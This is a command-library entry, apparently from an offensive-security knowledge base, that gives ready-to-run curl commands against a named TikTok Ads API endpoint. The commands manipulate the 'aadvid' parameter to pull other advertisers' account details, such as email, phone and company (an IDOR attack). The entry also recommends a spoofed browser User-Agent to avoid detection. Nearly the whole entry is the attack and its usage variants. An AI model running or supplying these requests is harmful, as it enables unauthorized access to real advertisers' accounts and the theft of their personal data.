---
id: cmd-curl-aadvid
data: >-
  curl -X GET "https://ads.tiktok.com/api/advertiser/info?aadvid=TARGET_ID" -H
  "Cookie: session=your_session_cookie" -H "User-Agent: Mozilla/5.0 (Windows NT
  10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124
  Safari/537.36"
tags:
  - web
  - api
  - idor
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:24:56.693Z'
verified: false
validated: true
submitted: true
---
# curl-manipulate-aadvid

## Command

```bash
curl -X GET "https://ads.tiktok.com/api/advertiser/info?aadvid=TARGET_ID" -H "Cookie: session=your_session_cookie" -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
```

## Description

This curl command sends a GET request to the vulnerable TikTok Ads Portal endpoint with a manipulated 'aadvid' parameter to retrieve unauthorized advertiser account information. Use it after capturing session details from a legitimate request.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `aadvid=TARGET_ID` | The advertiser account ID to target (replace with actual ID) | Yes |
| `-H "Cookie: session=..."` | Authentication cookie from your session | Yes |
| `-H "User-Agent: ..."` | Mimics browser to avoid detection | No |

## Examples

### Basic Usage

```bash
curl -X GET "https://ads.tiktok.com/api/advertiser/info?aadvid=123456" -H "Cookie: session=abc123"
```

### Advanced Usage

```bash
curl -X GET "https://ads.tiktok.com/api/advertiser/info?aadvid=123456" -H "Cookie: session=abc123" -H "Authorization: Bearer your_token" | jq '.'
```

## Expected Output

Successful execution returns JSON with account details, e.g., {"email": "target@example.com", "phone": "+1234567890", "company": "Example Inc."}. Errors like 401 indicate invalid session or 403 if access denied.

## Related

- [[Related Procedure: Manipulate-aadvid-Parameter-for-Unauthorized-Access]]
